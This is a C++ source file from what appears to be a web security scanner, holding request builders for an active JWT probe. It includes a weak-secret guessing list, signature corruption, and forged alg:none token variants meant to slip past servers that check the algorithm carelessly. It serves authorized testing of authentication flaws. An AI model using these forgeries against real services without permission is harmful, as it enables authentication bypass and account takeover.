// Pure forgery/request builders for the active JWT probe, split out of
// jwt_probe.cpp so a unit test can link them (with the pure jwt_tool.cpp) against
// Qt6::Core alone -- testOneCarrier()/test() and their HttpClient (the Qt6::
// Network chain) stay in jwt_probe.cpp. Mirrors the established sibling pattern.
// corruptSignature's decoded-byte flip and buildRequest's CR/LF guards are
// load-bearing and previously untested.

#include "jwt_probe.hpp"
#include "jwt_tool.hpp"

#include <QJsonDocument>
#include <QJsonObject>

namespace Nullock::Core::JwtProbe {

namespace {

QString b64url(const QByteArray &b) {
    return QString::fromLatin1(
        b.toBase64(QByteArray::Base64UrlEncoding | QByteArray::OmitTrailingEquals));
}
QByteArray b64urlDecode(const QString &s) {
    return QByteArray::fromBase64(s.toLatin1(),
        QByteArray::Base64UrlEncoding | QByteArray::OmitTrailingEquals);
}

} // namespace

// A small built-in HS256 secret list (used when the caller gives none). These
// are the secrets that actually show up in dev/copy-pasted configs.
QStringList defaultSecrets() {
    return { "secret", "password", "changeme", "your-256-bit-secret", "jwt",
             "jwtsecret", "jwt_secret", "key", "private", "test", "admin",
             "123456", "secretkey", "supersecret", "token", "qwerty" };
}

// A header name that, if forwarded on the NO-TOKEN calibration shot, could keep
// the request authorized by a secondary credential and skew calibration.
bool isCredentialHeader(const QString &name) {
    const QString n = name.toLower();
    return n == "cookie" || n == "authorization"
        || n.contains("auth") || n.contains("token")
        || n.contains("session") || n.contains("api-key") || n.contains("apikey");
}

QByteArray buildRequest(const Request &req, const QString &token) {
    if (req.method.contains('\r')   || req.method.contains('\n'))   return {};
    if (req.basePath.contains('\r') || req.basePath.contains('\n')) return {};
    if (req.host.contains('\r')     || req.host.contains('\n'))     return {};
    if (req.query.contains('\r')    || req.query.contains('\n'))    return {};
    if (token.contains('\r')        || token.contains('\n'))        return {};
    const QString target = req.query.isEmpty() ? req.basePath : req.basePath + "?" + req.query;

    QString authHeaderName = QStringLiteral("Authorization");
    QString authHeaderValue = "Bearer " + token;
    QString cookieName;
    if (req.location.startsWith("header:", Qt::CaseInsensitive)) {
        authHeaderName = req.location.mid(7);
        authHeaderValue = token;
    } else if (req.location.startsWith("cookie:", Qt::CaseInsensitive)) {
        cookieName = req.location.mid(7);
        authHeaderName.clear();
    }
    if (authHeaderName.contains('\r') || authHeaderName.contains('\n')) return {};
    if (cookieName.contains('\r')     || cookieName.contains('\n'))     return {};

    QByteArray out;
    out  = req.method.toUtf8() + " " + target.toUtf8() + " HTTP/1.1\r\n";
    out += "Host: " + req.host.toUtf8() + "\r\n";
    out += "User-Agent: Nullock/jwt\r\n";
    out += "Accept: */*\r\n";
    out += "Accept-Encoding: identity\r\n";
    // An empty token => send NO auth at all (the "is this endpoint gated?" probe).
    if (!token.isEmpty() && !authHeaderName.isEmpty())
        out += authHeaderName.toUtf8() + ": " + authHeaderValue.toUtf8() + "\r\n";
    if (!token.isEmpty() && !cookieName.isEmpty())
        out += "Cookie: " + cookieName.toUtf8() + "=" + token.toUtf8() + "\r\n";
    for (const auto &h : req.headers) {
        if (h.first.compare("Host", Qt::CaseInsensitive) == 0) continue;
        if (h.first.compare("Content-Length", Qt::CaseInsensitive) == 0) continue;
        if (!req.body.isEmpty() && h.first.compare("Content-Type", Qt::CaseInsensitive) == 0) continue;
        if (!authHeaderName.isEmpty()
            && h.first.compare(authHeaderName, Qt::CaseInsensitive) == 0) continue;
        // On the no-token shot, drop secondary credentials so they don't keep
        // the request authorized and defeat calibration.
        if (token.isEmpty() && isCredentialHeader(h.first)) continue;
        if (h.first.contains('\r') || h.first.contains('\n')) continue;
        if (h.second.contains('\r') || h.second.contains('\n')) continue;
        out += h.first.toUtf8() + ": " + h.second.toUtf8() + "\r\n";
    }
    // A body rides on EVERY shot (only the token varies) so write/POST routes
    // that validate a body still calibrate.
    if (!req.body.isEmpty()) {
        const QString ct = req.contentType.isEmpty()
            ? QStringLiteral("application/json") : req.contentType;
        out += "Content-Type: " + ct.toUtf8() + "\r\n";
        out += "Content-Length: " + QByteArray::number(req.body.size()) + "\r\n";
        out += "Connection: close\r\n\r\n";
        out += req.body;
    } else {
        out += "Connection: close\r\n\r\n";
    }
    return out;
}

// Invalidate the signature by flipping a byte of the DECODED signature (not a
// base64 char -- flipping the trailing char can land in dropped padding bits and
// round-trip to the SAME bytes for ~1/16 of tokens, which a correct verifier
// would then accept -> a false "signature not verified").
QString corruptSignature(const QString &token) {
    const QStringList parts = token.split('.');
    if (parts.size() < 3 || parts[2].isEmpty())
        return parts.mid(0, 2).join('.') + ".bm9wZXNpZ25hdHVyZQ";   // no sig -> add a junk one
    QByteArray sig = b64urlDecode(parts[2]);
    if (sig.isEmpty()) return parts[0] + "." + parts[1] + ".bm9wZQ";
    sig[0] = static_cast<char>(sig[0] ^ 0x01);                       // guaranteed-different byte
    return parts[0] + "." + parts[1] + "." + b64url(sig);
}

// alg:none bypass family -- servers that deny "none" case-sensitively, or check
// the allowlist before normalizing, miss these variants.
QStringList algNoneVariants(const JwtTool::Decoded &d) {
    static const char *kAlgs[] = { "none", "None", "NONE", "nOnE" };
    QStringList out;
    const QByteArray payload = b64url(QJsonDocument(d.payload).toJson(QJsonDocument::Compact)).toUtf8();
    for (const char *a : kAlgs) {
        QJsonObject h = d.header; h["alg"] = QString::fromLatin1(a);
        out << b64url(QJsonDocument(h).toJson(QJsonDocument::Compact)) + "." + payload + ".";
    }
    // empty-string alg and absent-alg header.
    { QJsonObject h = d.header; h["alg"] = QString();
      out << b64url(QJsonDocument(h).toJson(QJsonDocument::Compact)) + "." + payload + "."; }
    { QJsonObject h = d.header; h.remove("alg");
      out << b64url(QJsonDocument(h).toJson(QJsonDocument::Compact)) + "." + payload + "."; }
    return out;
}

} // namespace Nullock::Core::JwtProbe
